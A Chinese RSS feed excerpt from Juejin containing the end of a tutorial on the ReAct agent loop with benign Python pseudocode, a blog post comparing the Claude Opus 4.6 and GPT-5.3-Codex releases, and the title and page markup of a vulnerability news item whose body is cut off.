<p><img src="https://pic.zhangshichun.top/pic/20260205205848394.png" alt="" loading="lazy"/></p>
<p>基于以上条件，我们可以得出：</p>
<p><strong>AI 的“脑回路”是可以被塑造的，不同的范式适合干不同的活：</strong></p>
<p>CoT 范式（链式思考）： 适合做数学题、逻辑推理。强迫它一步步走，防止跳跃。</p>
<p>ReAct 范式（反应式）： 适合干活、查资料。强迫它动一下手、看一眼结果。</p>
<p>ToT 范式（树状思考）： 适合写小说、搞创意。强迫它多想几个方案，选最好的。</p>
<p>“思维范式”就是我们人类为了让 AI 这种“概率机器”能够像人一样严谨地处理复杂任务，而发明的一套套“紧箍咒”和“流程图”。</p>
<h3 data-id="heading-4">四：所以为什么是 ReAct</h3>
<p>在 ReAct 出现之前，LLM 主要面临两种极端困境：</p>
<ul>
<li>
<p>光想不做（纯推理，如 Chain of Thought）： 模型可以写出优美的逻辑推导，但它像个被关在黑盒里的哲学家，无法获取外部世界的实时信息。它会一本正经地告诉你“2024年的奥运会冠军是...”（幻觉），因为它不知道今天其实才2023年。</p>
</li>
<li>
<p>光做不想（纯执行）： 简单的脚本可以让模型调用 API，但如果没有推理过程，模型就像无头苍蝇。一旦 API 报错，它不知道该重试、修改参数还是放弃。</p>
</li>
</ul>
<p>ReAct (Reasoning + Acting) 的诞生，就是为了解决这个问题。它的核心哲学非常简单且深刻：</p>
<p><strong>每一次行动之前，都要先思考；每一次行动之后，都要观察结果。</strong></p>
<h3 data-id="heading-5">五、ReAct 的特点</h3>
<p>ReAct 不仅仅是一个虚无缥缈的“思想”，它在工程实现上已经形成了一套严密的标准规范。</p>
<p>在 LangChain 等框架中（以 <code>hwchase17/react</code> 为代表），它表现为一个无限循环的 While Loop：</p>
<p>二、 深度解构：ReAct 的标准“三步舞”
正如我们之前讨论的，ReAct 不仅仅是一个虚无缥缈的“思想”，它在工程实现上已经形成了一套严密的标准规范。在 LangChain 等框架中（以 hwchase17/react 为代表），它表现为一个无限循环的 While Loop：</p>
<ol>
<li>Thought（思考）
这是模型的“内心独白”。模型分析当前的情况，决定下一步该做什么。</li>
</ol>
<blockquote>
<p>“用户想知道现在的天气。我不能直接编造，我需要使用天气查询工具。”</p>
</blockquote>
<ol>
<li>Action（行动）
这是模型伸出“手”去触碰世界。它生成特定的格式化代码，去调用搜索、数据库或 API。</li>
</ol>
<blockquote>
<p>行动: 调用Weather_API  参数：北京</p>
</blockquote>
<ol>
<li>Observation（观察）
这是环境给模型的“反馈”。这是唯一不由 LLM 生成，而是由外部代码返回的部分。</li>
</ol>
<blockquote>
<p>观察: API 返回错误：Error 404，城市名称需使用拼音。</p>
</blockquote>
<p>—— 循环回到 Thought 思考 ——</p>
<p>思考: 哎呀，出错了。原来需要用拼音。那我重新尝试一下。 &gt; 行动: 调用Weather_API  参数 beijing</p>
<p>正是因为有了 Observation（观察） 这一环，Agent 才拥有了“自我纠错”的能力。</p>
<p><img src="https://pic.zhangshichun.top/pic/20260205210658461.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">六、认识一下其他流行的【思维范式】</h3>
<p>掌握了 ReAct 只是入门。在解决更复杂的问题时，AI 科学家们还发明了其他思维范式。我们可以将 ReAct 作为坐标原点，看看其他的流派：</p>









































<table><thead><tr><th align="left">思维范式</th><th align="left">核心逻辑</th><th align="left">适用场景</th><th align="left">优缺点对比</th></tr></thead><tbody><tr><td align="left"><strong>CoT (Chain of Thought)</strong></td><td align="left"><strong>纯思考</strong><br/>一步步推理 -&gt; 答案</td><td align="left">纯逻辑数学题、常识推理</td><td align="left">❌ 无法联网，有幻觉<br/>✅ 速度快，无需工具</td></tr><tr><td align="left"><strong>ReAct</strong></td><td align="left"><strong>边想边做</strong><br/>思考-行动-观察 -&gt; 循环</td><td align="left">资料检索、API 调用、通用助理</td><td align="left">✅ 容错率高，最稳健<br/>❌ 步骤多，消耗 Token，速度慢</td></tr><tr><td align="left"><strong>Plan-and-Solve (AutoGPT式)</strong></td><td align="left"><strong>先计划，后执行</strong><br/>列出任务清单 -&gt; 逐个击破</td><td align="left">复杂长任务（如：写一个游戏）</td><td align="left">✅ 全局观强，不迷路<br/>❌ 灵活性差，计划赶不上变化</td></tr><tr><td align="left"><strong>Reflexion</strong></td><td align="left"><strong>事后反思</strong><br/>执行 -&gt; 失败 -&gt; 反思原因 -&gt; 重试</td><td align="left">编写代码、高难度解题</td><td align="left">✅ 自我进化能力强<br/>❌ 极其消耗 Token</td></tr><tr><td align="left"><strong>ToT (Tree of Thoughts)</strong></td><td align="left"><strong>思维树</strong><br/>生成多个方案 -&gt; 选最好的 -&gt; 继续</td><td align="left">创意写作、解谜（24点游戏）</td><td align="left">✅ 探索性最强，能找到最优解<br/>❌ 极慢，工程复杂度高</td></tr></tbody></table>
<h3 data-id="heading-7">七、ReAct 的现状：从“显学”到“本能”</h3>
<p>我们在开发中经常提到 hwchase17/react 这个提示词模板，它在很长一段时间内是 Agent 的标准配置。</p>
<p>但在 2024 年以后的新时代，事情发生了一点微妙的变化：</p>
<ul>
<li>
<p>对于开源/小模型： ReAct 依然是绝对标准。你需要明确地在 Prompt 里写上 "Question/Thought/Action" 的格式要求，模型才能听懂。</p>
</li>
<li>
<p>对于顶尖模型（GPT-4o, Claude 3.5）： ReAct 正在被内化。通过 Native Function Calling（原生函数调用），模型已经把“思考-行动”的循环刻在了权重里。你不再需要写复杂的 ReAct 提示词，直接给它工具，它就会自动展现出类似 ReAct 的行为。</p>
</li>
</ul>
<p>无论技术如何迭代，ReAct 都是理解 AI Agent 运行机制的“钥匙”。</p>
<p>当你第一次看到控制台里打印出： Thought: 我需要搜索一下... Observation: 搜索到了结果... Final Answer: 答案是...</p>
<p>那一刻，你构建的不仅仅是一段代码，而是一个拥有了感知（Observation）和行动（Action）能力的初级数字生命。这就是 ReAct 的魅力所在。</p>
<h3 data-id="heading-8">八、如写写代码？</h3>
<p>因为本章第七节内容的原因，现在的 DeepSeek（以及 GPT-4、Claude 3.5）已经把 ReAct 的能力“吃”进了模型内部，变成了本能，不再需要你用“说明书”（提示词）去教它了。</p>
<p>这个技术叫做 Native Function Calling（原生函数调用）。欸？和我们上一章的内容结合起来了。</p>
<p>在目前，一个标准的 ReAct 场景下的伪代码，大概是这样的：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_native_agent</span>(<span class="hljs-params">query, tools_map, tools_schema</span>):
    <span class="hljs-comment"># 初始化消息历史</span>
    messages = [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}]
    
    <span class="hljs-keyword">while</span> step &lt; max_steps:
        <span class="hljs-comment"># 1. API 调用 (直接传 tools，模型内部处理 ReAct 逻辑)</span>
        response = client.chat.completions.create(
            model=<span class="hljs-string">"deepseek-chat"</span>,
            messages=messages,
            tools=tools_schema 
        )
        msg = response.choices[<span class="hljs-number">0</span>].message

        <span class="hljs-comment"># 2. 终止条件：如果没有工具调用请求，说明是最终答案</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> msg.tool_calls:
            <span class="hljs-keyword">return</span> msg.content 

        <span class="hljs-comment"># 3. 记录意图：将模型 "想调工具" 的决定压入历史</span>
        messages.append(msg)

        <span class="hljs-comment"># 4. 执行与反馈 (Acting + Observation)</span>
        <span class="hljs-keyword">for</span> tool <span class="hljs-keyword">in</span> msg.tool_calls:
            <span class="hljs-comment"># 自动解析 JSON 参数</span>
            func_name = tool.function.name
            args = json.loads(tool.function.arguments)
            
            <span class="hljs-comment"># 执行本地代码</span>
            result = tools_map[func_name](**args)
            
            <span class="hljs-comment"># 闭环：以 "tool" 角色回填观察结果</span>
            messages.append({
                <span class="hljs-string">"role"</span>: <span class="hljs-string">"tool"</span>,
                <span class="hljs-string">"tool_call_id"</span>: tool.<span class="hljs-built_in">id</span>, <span class="hljs-comment"># ID 必须对应</span>
                <span class="hljs-string">"content"</span>: <span class="hljs-built_in">str</span>(result)
            })
            
        <span class="hljs-comment"># 循环继续，下一轮 API 调用时模型就能看到 tool 的结果</span>
</code></pre>
<p>对，是一个 <code>while</code> 循环，因此，ReAct又有人把它称为“ReAct Loop”。</p>
<p>中文暂时没有特别权威的叫法，我习惯叫它：</p>
<blockquote>
<p>思动循环。</p>
</blockquote>
<h3 data-id="heading-9">下一步预告</h3>
<p>经过两节课知识的武装，我们已经变得非常强大。</p>
<p>下节课，我们将直接使用本节课和上节课学到的知识进行实战！</p>
<p>目标：</p>
<blockquote>
<p>一个可以帮你自动规整桌面的桌面小秘书！</p>
</blockquote>
<p>敬请期待！</p>
<p><img src="https://pic.zhangshichun.top/pic/ScreenShot_2026-01-26_082327_821.png" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[神仙打架！Claude Opus 4.6 vs GPT-5.3-Codex 同日发布，AI 编程格局要变了]]></title>    <link>https://juejin.cn/post/7603185231802597402</link>    <guid>https://juejin.cn/post/7603185231802597402</guid>    <pubDate>2026-02-05T21:07:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603185231802597402" data-draft-id="7603186080494501939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="神仙打架！Claude Opus 4.6 vs GPT-5.3-Codex 同日发布，AI 编程格局要变了"/> <meta itemprop="keywords" content="LLM,AI编程,Claude"/> <meta itemprop="datePublished" content="2026-02-05T21:07:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            神仙打架！Claude Opus 4.6 vs GPT-5.3-Codex 同日发布，AI 编程格局要变了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T21:07:41.000Z" title="Thu Feb 05 2026 21:07:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p><strong>今天，AI 编程史上最疯狂的一天。</strong></p>
<p>Claude 和 GPT 选在同一天、同一时刻发布重磅更新。</p>
<p>Anthropic 放出 Opus 4.6，OpenAI 紧跟着扔出 GPT-5.3-Codex。</p>
<p>两家公司的 PR 团队，怕是提前对过表。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56ea645a54c24aa6b12ddb85ba7528e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930460&amp;x-signature=xSDZJ9bTajXztq4kx7Dq40xP7Kk%3D" alt="" loading="lazy"/></p>
<p>作为一个天天用 Claude Code 写代码的人，我第一时间扒了两边的更新。</p>
<p>结论先放这：<strong>这不是简单的版本迭代，是 AI 编程从"助手"到"同事"的分水岭。</strong></p>
<hr/>
<h2 data-id="heading-0">01 Claude Opus 4.6：三个核弹级更新</h2>
<p>先说 Anthropic 这边。Opus 4.6 的更新，用三个词概括：<strong>更大、更长、能组队</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3243ba05d6a48d2af0afc91131b5d29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930460&amp;x-signature=3XX6QVpnetodphrNIqCuxbd8jG8%3D" alt="" loading="lazy"/></p>
<p><strong>第一颗核弹：1M token 上下文</strong></p>
<p>Opus 终于支持 100 万 token 上下文了。</p>
<p>这意味着什么？以前你让 Claude 改一个大项目，它只能看到一小部分代码，改着改着就"失忆"了。现在，整个代码库它都能装进脑子里。</p>
<p><strong>以前</strong>：改个文件要反复贴代码、反复解释上下文。</p>
<p><strong>现在</strong>：把整个项目扔进去，它自己理解，自己改。</p>
<p><strong>第二颗核弹：128K 输出 token</strong></p>
<p>不仅能读得多，还能写得长。一次性输出 12.8 万 token，相当于一本小书的篇幅。</p>
<p>写长文档、生成完整模块、一次性重构整个功能——以前要分好几轮的活，现在一轮搞定。</p>
<p><strong>第三颗核弹：Agent Teams</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48349ca73ca148549df0f88a5f3ed552~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930460&amp;x-signature=geI2f6CMBgADHp2cYNLXD6ZoebU%3D" alt="" loading="lazy"/></p>
<p>这个是真的炸。</p>
<p>Claude Code 现在支持<strong>多 Agent 团队协作</strong>。你可以让多个 Claude 同时并行工作：一个审代码、一个写测试、一个改文档。</p>
<p><strong>以前</strong>：一个 AI 干活，你在旁边等。</p>
<p><strong>现在</strong>：一群 AI 同时干活，你在旁边喝咖啡。</p>
<p>还有个彩蛋：PowerPoint 生成功能进入预览。Claude 能直接在 PPT 里工作，读懂你的模板和品牌规范，改完的 slides 不会乱了格式。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee36cc76e52042a88c2ad75779033607~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930460&amp;x-signature=GiLLRn%2FsJuVQrdYCEiX2DIia9Qk%3D" alt="" loading="lazy"/></p>
<p><strong>价格呢？没变。</strong> 和 Opus 4.5 一样。</p>
<hr/>
<h2 data-id="heading-1">02 GPT-5.3-Codex：OpenAI 的反击</h2>
<p>OpenAI 这边也不甘示弱。GPT-5.3-Codex 的更新，核心是两个字：<strong>更快、更狠</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0e3ad938567424aa0eb93a9bab72fe1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930460&amp;x-signature=bLNF26rGDiru4kZTj%2BIIkxTCZLQ%3D" alt="" loading="lazy"/></p>
<p><strong>25% 速度提升</strong></p>
<p>同样的任务，跑得更快。对于长任务来说，25% 的提速意味着你能在一天内多跑好几轮迭代。</p>
<p><strong>首个"自己造自己"的模型</strong></p>
<p>这个有点细思极恐。OpenAI 说，GPT-5.3-Codex 是他们第一个<strong>参与创造自身</strong>的模型——Codex 团队用 Codex 来调试自己的训练、管理部署、诊断测试结果。</p>
<p>AI 开始帮人类造 AI 了。</p>
<p><strong>中途可调整，不丢上下文</strong></p>
<p>以前用 Codex 做长任务，中间想改个方向很麻烦，经常要重新开始。现在你可以随时"转向"，它不会忘记之前做了什么。</p>
<p><strong>任务时长突破一天</strong></p>
<p>OpenAI 测试了用 Codex 连续跑超过 24 小时的项目，造了两个网页游戏。这意味着你可以给它一个大活，然后去睡觉，醒来活儿干完了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f62cf757c004c03aefbc7323a7584c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770930460&amp;x-signature=a%2BkvPGeOT3ES0t535b%2FtlEe%2FtRk%3D" alt="" loading="lazy"/></p>
<p><strong>不止是写代码</strong></p>
<p>GPT-5.3-Codex 明确说，它覆盖整个软件生命周期：调试、部署、监控、写 PRD、用户研究、写测试、看数据……</p>
<p><strong>以前</strong>：Codex 是个"代码生成器"。 <strong>现在</strong>：Codex 想当你的"数字员工"。</p>
<hr/>
<h2 data-id="heading-2">03 为什么选在同一天？</h2>
<p>两家同日发布，绝非巧合。</p>
<p>GitHub 刚宣布 Agent HQ 平台，让 Copilot、Claude、Codex 三家同台竞技。开发者可以在 GitHub 里自由切换不同的 AI 编程助手。</p>
<p><strong>这是一场"货架争夺战"。</strong></p>
<p>以前，你用 Cursor 就绑定了 Claude，用 Copilot 就绑定了 GPT。现在 GitHub 把货架打开了，三家产品摆在一起，用户自己挑。</p>
<p>谁的产品更强，谁就能抢到更多用户。所以两家必须在同一天亮剑。</p>
<hr/>
<h2 data-id="heading-3">04 我的判断：该站队吗？</h2>
<p>说实话，<strong>不用站队</strong>。</p>
<p>这轮更新之后，Claude 和 GPT 在 AI 编程上的差距进一步缩小。两边都在往"自主 Agent"的方向卷：更长的上下文、更强的规划能力、更少的人工干预。</p>
<p><strong>如果你是 Claude Code 用户</strong>：继续用。Agent Teams + 1M 上下文，对大项目的体验提升是质变级的。</p>
<p><strong>如果你是 Codex 用户</strong>：继续用。25% 提速 + 超长任务支持，做产品原型会更爽。</p>
<p><strong>如果你两边都没深度用过</strong>：现在是最好的入场时机。GitHub Agent HQ 让你可以零成本切换，哪个顺手用哪个。</p>
<p>我自己的选择？<strong>主力还是 Claude Code，但 Codex 会作为第二选项。</strong></p>
<p>原因很简单：Claude 的"思维链"更透明，改代码的时候我能看懂它在想什么。Codex 的速度优势在短任务上感知不明显，但做超长任务时会考虑切过去。</p>
<hr/>
<h2 data-id="heading-4">05 一个更大的信号</h2>
<p>今天这场神仙打架，真正的信号不是"谁更强"。</p>
<p>而是：<strong>AI 编程正式进入"多 Agent 协作"时代。</strong></p>
<p>Claude 的 Agent Teams、Codex 的自我迭代、GitHub 的多 Agent 平台——所有迹象都指向同一个方向：未来的软件开发，不是"一个程序员 + 一个 AI 助手"，而是"一个程序员 + 一群 AI 同事"。</p>
<p>你要管理的不再是代码，而是 Agent。</p>
<p><strong>以前</strong>：你是工程师。</p>
<p><strong>现在</strong>：你是 AI 团队的 Tech Lead。</p>
<p>这个转变，比任何一次框架更迭都要剧烈。</p>
<hr/>
<h2 data-id="heading-5">写在最后</h2>
<p>有人问我，AI 编程工具这么卷，程序员会不会被替代？</p>
<p>我的看法是：<strong>工具越强，会用工具的人越值钱。</strong></p>
<p>今天 Claude 和 GPT 的更新，本质上是在降低"把想法变成产品"的门槛。但"有好想法"这件事，门槛反而在提高——因为竞争者都在用同样的工具。</p>
<p><strong>AI 会替代不用 AI 的程序员。</strong></p>
<p>这句话我说了很多次，今天再说一次。工具就摆在这里。用不用，是你的事。</p>
<hr/>
<p>如果这篇对你有帮助，欢迎点赞、收藏、关注，你的支持是我持续输出的动力 ✨</p>
<hr/>
<p>我的其他平台账号和开源项目在个人主页中，欢迎交流 🤝</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw漏洞允许通过恶意链接一键远程执行代码]]></title>    <link>https://juejin.cn/post/7603215839582175242</link>    <guid>https://juejin.cn/post/7603215839582175242</guid>    <pubDate>2026-02-05T21:15:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603215839582175242" data-draft-id="7603215839582158858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw漏洞允许通过恶意链接一键远程执行代码"/> <meta itemprop="keywords" content="AIGC,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T21:15:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Dcs"/> <meta itemprop="url" content="https://juejin.cn/user/3679404422861902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw漏洞允许通过恶意链接一键远程执行代码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3679404422861902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Dcs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T21:15:01.000Z" title="Thu Feb 05 2026 21:15:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body 